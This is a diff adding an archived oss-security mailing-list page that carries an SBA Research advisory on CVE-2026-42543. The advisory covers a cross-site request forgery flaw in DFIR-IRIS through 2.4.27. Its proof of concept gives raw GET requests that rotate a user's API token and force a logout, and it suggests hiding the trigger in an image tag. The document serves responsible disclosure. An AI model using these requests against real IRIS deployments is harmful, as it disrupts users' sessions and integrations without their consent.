@@ -1,0 +1,326 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - [SBA-ADV-20260128-03] CVE-2026-42543: DFIR-IRIS before 2.4.28
+ Cross-Site Request Forgery (CSRF)</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="10">[&lt;prev]</a> <a href="12">[next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;79f185e0e5024eb5b3c04706d0ed8628&#64;sba-research.org&gt;
+Date: Tue, 19 May 2026 14:15:47 +0000
+From: SBA Research Security Advisory &lt;advisory&#64;...-research.org&gt;
+To: "oss-security&#64;...ts.openwall.com" &lt;oss-security&#64;...ts.openwall.com&gt;
+Subject: [SBA-ADV-20260128-03] CVE-2026-42543: DFIR-IRIS before 2.4.28
+ Cross-Site Request Forgery (CSRF)
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
+
+# DFIR-IRIS Cross-Site Request Forgery (CSRF) #
+
+Link: <a href="https://github.com/sbaresearch/advisories/tree/public/2026/SBA-ADV-20260128-03_DFIR-IRIS_CSRF" rel="nofollow">https://github.com/sbaresearch/advisories/tree/public/2026/SBA-ADV-20260128-03_DFIR-IRIS_CSRF</a>
+
+## Vulnerability Overview ##
+
+The IRIS web application is vulnerable to a *Cross-site request forgery*
+attack, because it uses the HTTP method `GET` to change state on the server.
+
+* **Identifier**            : SBA-ADV-20260128-03
+* **Type of Vulnerability** : Cross-site request forgery (CSRF)
+* **Software/Product Name** : [IRIS](<a href="https://www.dfir-iris.org/" rel="nofollow">https://www.dfir-iris.org/</a>)
+* **Vendor**                : [DFIR-IRIS](<a href="https://github.com/dfir-iris" rel="nofollow">https://github.com/dfir-iris</a>)
+* **Affected Versions**     : &lt;= 2.4.27
+* **Fixed in Version**      : v2.4.28
+* **CVE ID**                : CVE-2026-42543
+* **CVSS Vector**           : CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N
+* **CVSS Base Score**       : 4.3 (Medium)
+
+## Vendor Description ##
+
+&gt; IRIS is a collaborative digital platform designed for incident response
+&gt; analysts to share complex investigations at a technical level. It can be
+&gt; installed on a dedicated server or as a portable application for roaming
+&gt; investigations where internet access might not be available.
+
+Source: &lt;<a href="https://docs.dfir-iris.org/2.4.24/" rel="nofollow">https://docs.dfir-iris.org/2.4.24/</a>&gt;
+
+## Impact ##
+
+With the indicated attack, users visiting a malicious website, or even
+certain parts of the application itself, can inadvertently trigger action
+while having an active session. Those actions include the rotation of an
+API-token and ending the session via a logout.
+
+## Vulnerability Description ##
+
+The application accepts parameters both when they are transmitted using the
+HTTP-GET and HTTP-POST methods. This unnecessarily expands the attack surface
+and facilitates *Cross-site request forgery (CSRF)*, *Cross-Site Scripting*
+or *Server-Side-Request-Forgery* attacks (SSRF), for example. This renders
+all available protective controls against CSRF attacks ineffective.
+
+## Proof of Concept ##
+
+### API Key Rotation ###
+
+The following HTTP communication rotates the API key of the account:
+
+Request:
+
+```http
+GET /user/token/renew?cid=1 HTTP/1.1
+Host: myiris.local
+Cookie: session=.eJw[...]
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+X-Requested-With: XMLHttpRequest
+Referer: <a href="https://myiris.local/user/settings?cid=1" rel="nofollow">https://myiris.local/user/settings?cid=1</a>
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
+Connection: keep-alive
+```
+
+Response:
+
+```http
+HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 26 Jan 2026 10:47:31 GMT
+Content-Type: application/json
+Content-Length: 61
+Connection: keep-alive
+Vary: Cookie
+Content-Security-Policy: default-src 'self' <a href="https://analytics.dfir-iris.org" rel="nofollow">https://analytics.dfir-iris.org</a>; script-src 'self' 'unsafe-inline' <a href="https://analytics.dfir-iris.org" rel="nofollow">https://analytics.dfir-iris.org</a>; style-src 'self' 'unsafe-inline'; img-src 'self' data:;
+X-XSS-Protection: 1; mode=block
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000: includeSubDomains
+Front-End-Https: on
+
+{"status": "success", "message": "Token renewed", "data": []}
+```
+
+After performing this operation, the previously used token will be
+unavailable and all applications relying on it will cease to function. The
+currently implemented CSRF-protection via the usage of the `csrf-token` is
+not working for `GET`-requests.
+
+The attack could be performed by luring the user onto a malicious site, or
+even by hiding the tag in the IRIS application itself, e.g., by setting an
+HTML descriptions like this:
+
+![Screenshot of a forced API token renewal inside an image URL](images/CSRF_html.png)
+
+### Logout ###
+
+Another susceptible endpoint to this vulnerability is the logout
+functionality:
+
+```http
+GET /logout HTTP/1.1
+Host: myiris.local
+Cookie: session=.eJw[...]
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: <a href="https://myiris.local/dashboard" rel="nofollow">https://myiris.local/dashboard</a>
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+
+HTTP/1.1 302 FOUND
+Server: nginx
+Date: Mon, 26 Jan 2026 13:57:27 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 213
+Connection: keep-alive
+Location: /login?next=/
+Vary: Cookie
+Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0; Secure; HttpOnly; Path=/; SameSite=Lax
+Content-Security-Policy: default-src 'self' <a href="https://analytics.dfir-iris.org" rel="nofollow">https://analytics.dfir-iris.org</a>; script-src 'self' 'unsafe-inline' <a href="https://analytics.dfir-iris.org" rel="nofollow">https://analytics.dfir-iris.org</a>; style-src 'self' 'unsafe-inline'; img-src 'self' data:;
+X-XSS-Protection: 1; mode=block
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000: includeSubDomains
+Front-End-Https: on
+
+[...]
+```
+
+## Recommended Countermeasures ##
+
+We recommend updating to IRIS version 2.4.28 or later.
+
+When parameters are sent by default using the POST method, IRIS should only
+accept them using POST.
+
+It must also be ensured that GET requests do not lead to any status changes
+on the server.
+
+## Timeline ##
+
+* `2026-01-28` Identified the vulnerability in version 2.4.26
+* `2026-01-30` Initial vendor contact via e-mail
+* `2026-02-27` Second vendor contact via e-mail
+* `2026-03-30` Report on GitHub due to a missing response from the vendor
+* `2026-04-27` Version containing fix (v2.4.28) tagged by vendor
+* `2026-04-28` GitHub assigned CVE-2026-42543
+* `2026-05-04` Confirm fix for v2.4.28
+* `2026-05-19` Public disclosure
+
+## References ##
+
+* RFC 7231. Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content.
+  Safe Methods: &lt;<a href="https://www.rfc-editor.org/rfc/rfc7231.html#section-4.2.1" rel="nofollow">https://www.rfc-editor.org/rfc/rfc7231.html#section-4.2.1</a>&gt;
+* Common Weakness Enumeration. CWE-650 Trusting HTTP Permission Methods on the
+  Server Side: &lt;<a href="https://cwe.mitre.org/data/definitions/650.html" rel="nofollow">https://cwe.mitre.org/data/definitions/650.html</a>&gt;
+
+## Credits ##
+
+* Michael Koppmann ([SBA Research](<a href="https://www.sba-research.org/" rel="nofollow">https://www.sba-research.org/</a>))
+* Mathias Tausig ([SBA Research](<a href="https://www.sba-research.org/" rel="nofollow">https://www.sba-research.org/</a>))
+
+The discovery of this vulnerability was made possible through support from
+[CYSSDE](<a href="https://cyssde.eu/" rel="nofollow">https://cyssde.eu/</a>) and the European Union.
+
+![CYSSDE](images/cyssde.png)
+-----BEGIN PGP SIGNATURE-----
+
+iQJPBAEBCAA5FiEEL9Wp/yZWFD9OpIt6+7iGL1j3dbIFAmoMcJEbFIAAAAAABAAO
+bWFudTIsMi41KzEuMTIsMiwxAAoJEPu4hi9Y93Wyi98P/0yjOvxsrRSOUldqqb5m
+dULRudFNUmmkQ8MNcURL3EJeJQdrA0B/H9lOokuXlLYizoGZ/hZ6nHCtlRFcfcB8
+6wJjfxQd43wR2OSGgM56sMwPHu6UQ3igD94OYBU5zgbTr0CZyPrkIqLHST+alkin
+zw7kL8KJU+58BX+CoR5mSFa+CNGZm9LOMUeUXpa13WO1SKu2tEASeMMT9tmpSaJy
+iMECcOkQKIH41HVizAOxs3TZz1LqSGSG2Vl0EAb5hQRl29+19wI3A4Pp54EAe+Rz
++XajaiiOp1ZK95CkjG4niasW3Mi7x8/uxRKNlXC54Za9TgsahHu7k0QY7LoCu54C
+Q6MxlYkGr/Epq5ibpTAN0PItPLTo1xOBcRJ4xaBoW3pulp2Ea6ZR4o+cJp513aPp
+ZgxlkBrrI4nN0yh7RtWW/I5WR0+89tswuMaSRN/AjlHHHVo/p/ix8+bW2xPIq/Pf
+5ePvRP2oL0X6c908P4VUi/ns2xLS1MVuKFVE4Ur0colP1Og8xIwMj9B0e5itdFPw
+SwuPhwafOq/xmErx6tEZgyWizpqXYJCWOx+Xwyuk3i2GkbHn9mt1/gSOlO67aSRk
+MpROMbwF8scLnF+OA84brpI4/BhQoId79Iu00cSu4CU4fUKjjfApIvla2XS3e0WC
+0buhtzGlQwMhizGPmCxFDqCn
+=TYEH
+-----END PGP SIGNATURE-----
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
